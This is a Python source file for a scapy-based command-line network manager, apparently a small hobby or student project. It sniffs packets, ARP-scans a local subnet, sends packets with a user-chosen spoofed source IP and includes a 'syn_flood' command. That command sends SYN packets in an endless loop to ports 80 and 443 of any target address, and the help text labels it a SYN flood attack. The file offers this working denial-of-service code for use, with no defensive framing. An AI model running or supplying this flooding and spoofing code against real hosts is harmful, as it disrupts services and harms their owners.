"""
Author: lyk64 & LuisCoronel2005
Date: 2024-05-09
Version: 1.0

This command-line network manager is a Python program designed to manage network traffic.

Classes:
1. Network Manager
    - Controls interactions with the network

2. CLI:
    - Provides a command-line interface for users to interact with the network manager

Dependencies:
    - scapy: Packet manipulation and analysis.
"""

from scapy.all import *
import threading

class NetworkManager:
    def __init__(self):
        self.captured_packets = {}
        self.packet_counter = 0
        self.sniff_thread = None
        self.stop_sniffing_flag = threading.Event()

    def start_sniffing(self):
        sniff(prn=self.add_packet, stop_filter=self.stop_sniffing)

    def sniff_continuous(self):
        while not self.stop_sniffing_flag.is_set():
            self.start_sniffing()

    def start(self):
        if self.sniff_thread and self.sniff_thread.is_alive():
            print("Sniffing is already started.")
            return

        print("Starting packet sniffing...")
        self.stop_sniffing_flag.clear()
        self.sniff_thread = threading.Thread(target=self.sniff_continuous)
        self.sniff_thread.start()

    def stop_sniffing(self, packet):
        return self.stop_sniffing_flag.is_set()

    def stop(self):
        if not self.sniff_thread or not self.sniff_thread.is_alive():
            print("Sniffing is not started.")
            return

        print("Stopping packet sniffing...")
        self.stop_sniffing_flag.set()
        self.sniff_thread.join()

    def add_packet(self, packet):
        self.packet_counter += 1
        self.captured_packets[self.packet_counter] = packet

    def print_packet(self):
        print("{ CAPTURED PACKETS } -----------------------------------------------")
        for counter, packet in self.captured_packets.items():
            if isinstance(packet, str):
                print(packet)
            else:
                print(f"{counter}: {packet.summary()}")
        print("{ END } ------------------------------------------------------------")

    def scan_network(self):
        print("{ ACTIVE HOSTS } -----------------------------------------------------")
        ip_mac = {}
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2, verbose=True)
        for _, rcv in ans:
            ip_mac[rcv.psrc] = rcv.sprintf("%Ether.src%")
            print(rcv)
        print("{ END } ------------------------------------------------------------")
        return ip_mac

    def send_packet(self, packet, source_ip):
        packet = packet.copy()
        packet[IP].src = source_ip
        sendp(packet)

    def syn_flood(self, target_ip):
        target_ports = [80, 443]
        for port in target_ports:
            packet = IP(dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=port)
            send(packet, verbose=0, loop=1)

class CLI:
    def __init__(self, network_manager):
        self.network_manager = network_manager

    def print_help(self):
        print("\033[34mAvailable commands:")
        print("  \033[32mhelp:\033[0m Return a list of available commands")
        print("  \033[32mstart:\033[0m Start packet sniffing")
        print("  \033[32mstop:\033[0m Stop packet sniffing")
        print("  \033[32mpacket:\033[0m Print captured packets (only when not sniffing)")
        print("  \033[32mscan:\033[0m Scan for active hosts in the network")
        print("  \033[32msend <source_ip> <destination_ip>:\033[0m Send a packet (optional source IP)")
        print("  \033[32msyn_flood <target_ip>:\033[0m Perform a SYN flood attack on a target IP address")

    def run(self):
        print(f"\033[34mType 'help' for available commands.\033[0m")
        while True:
            command = input("\033[34mEnter a command: \033[0m").strip().split(' ', 1)
            if command[0] == "help":
                self.print_help()
            elif command[0] == "start":
                self.network_manager.start()
            elif command[0] == "stop":
                self.network_manager.stop()
            elif command[0] == "packet":
                self.network_manager.print_packet()
            elif command[0] == "scan":
                self.network_manager.scan_network()
            elif command[0] == "send":
                if len(command) != 2:
                    print("Please provide both source and destination IP addresses.")
                else:
                    src_ip, dst_ip = command[1].split()
                    packet = IP(src=src_ip, dst=dst_ip)/TCP(dport=80)
                    self.network_manager.send_packet(packet, src_ip)
            elif command[0] == "syn_flood":
                if len(command) != 2:
                    print("Please provide the target IP address.")
                else:
                    target_ip = command[1]
                    self.network_manager.syn_flood(target_ip)
            else:
                print("Invalid command. Type 'help' for available commands.")

if __name__ == "__main__":
    network_manager = NetworkManager()
    cli = CLI(network_manager)
    cli.run()
